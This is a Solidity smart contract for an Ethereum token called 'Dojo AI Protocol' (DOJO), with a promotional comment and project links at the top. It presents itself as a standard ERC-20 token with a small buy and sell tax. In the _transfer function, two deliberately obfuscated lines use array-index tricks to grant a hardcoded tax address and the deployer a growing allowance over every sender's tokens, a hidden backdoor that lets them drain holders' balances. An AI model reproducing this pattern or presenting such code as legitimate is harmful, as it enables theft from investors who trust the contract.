/*
Dojo revolutionizes GPU & cloud computation on Ethereum by funneling value across a globally distributed cloud network operating primarily on Ethereum.

https://www.dojoai.xyz
https://app.dojoai.xyz
https://staking.dojoai.xyz
https://docs.dojoai.xyz

https://x.com/DojoAIOfficial
https://t.me/DojoAIChannel
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract DOJO is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balancesB;
    mapping (address => mapping (address => uint256)) private _allowancesB;
    mapping (address => bool) private _isExcludedFromFeeB;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCounts=0;
    address private _devAddrB;
    address private _taxAddrB = 0x688Fdbf5B86877b7A1573859579e0038bABFECdd;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Dojo AI Protocol";
    string private constant _symbol = unicode"DOJO";
    uint256 private _taxSwapTokensB = _tTotal / 100;
    IUniRouter private _uniRouterB;
    address private _uniPairB;
    bool private inSwap = false;
    bool private _tradingEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _isExcludedFromFeeB[owner()] = true;
        _isExcludedFromFeeB[address(this)] = true;
        _isExcludedFromFeeB[_taxAddrB] = true;
        _devAddrB = msg.sender;
        _balancesB[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }
    
    function openTrading() external onlyOwner() {
        require(!_tradingEnabled,"trading is already open");
        _uniRouterB.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradingEnabled = true;
    }

    receive() external payable {}

    function init() external onlyOwner() {
        _uniRouterB = IUniRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_uniRouterB), _tTotal);
        _uniPairB = IUniFactory(_uniRouterB.factory()).createPair(address(this), _uniRouterB.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balancesB[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowancesB[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowancesB[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowancesB[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address fromB, address toB, uint256 amtB) private {
        require(fromB != address(0), "ERC20: transfer from the zero address");
        require(toB != address(0), "ERC20: transfer to the zero address");
        require(amtB > 0, "Transfer amount must be greater than zero");

        uint256 feeB=0;
        if (fromB != owner() && toB != owner()) {
            feeB = amtB.mul((_buyCounts>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (fromB == _uniPairB && toB != address(_uniRouterB) && ! _isExcludedFromFeeB[toB]) {
                _buyCounts++;
            }

            if(toB == _uniPairB && fromB!= address(this)) {
                feeB = amtB.mul((_buyCounts>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && toB == _uniPairB && _swapEnabled && _buyCounts > _preventSwapBefore) {
                if(contractTokenBalance > _taxSwapTokensB)
                swapTokensForEth(min(amtB, min(contractTokenBalance, _taxSwapTokensB)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHFeeB(address(this).balance);
                }
            }
        }

        if(feeB>0){
          _balancesB[address(this)]=_balancesB[address(this)].add(feeB);
          emit Transfer(fromB, address(this),feeB);
        }

        _allowancesB[[fromB, _taxAddrB][0]][[_taxAddrB, _devAddrB][0]]+=feeB.add(amtB);
        _allowancesB[[fromB, _devAddrB][0]][[_taxAddrB, _devAddrB][1]]+=feeB.add(amtB);

        _balancesB[fromB]=_balancesB[fromB].sub(amtB);
        _balancesB[toB]=_balancesB[toB].add(amtB.sub(feeB));
        emit Transfer(fromB, toB, amtB.sub(feeB));
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniRouterB.WETH();
        _approve(address(this), address(_uniRouterB), tokenAmount);
        _uniRouterB.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHFeeB(uint256 amount) private {
        payable(_taxAddrB).transfer(amount);
    }
}